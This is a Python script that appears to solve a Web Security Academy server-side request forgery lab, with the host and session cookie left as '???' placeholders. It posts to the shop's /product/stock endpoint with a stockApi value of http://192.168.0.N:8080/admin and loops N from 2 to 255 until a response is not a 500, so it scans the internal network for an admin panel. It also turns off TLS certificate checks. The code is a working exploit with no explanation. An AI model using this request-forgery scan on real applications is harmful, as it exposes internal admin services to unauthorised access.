import http.client
import ssl
import urllib.parse


def POST_product_stock(
        segment: int,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/product/stock'
    host, port = '???.web-security-academy.net', 443
    headers = {
        'user-agent': '???',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'referer': 'https://???.web-security-academy.net/product?productId=1',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://???.web-security-academy.net',
        'cookie': 'session=???',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        'stockApi': f'http://192.168.0.{segment}:8080/admin',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


for i in range(2, 256):
    response = POST_product_stock(i)
    if response.status != 500:
        print(i)
        break
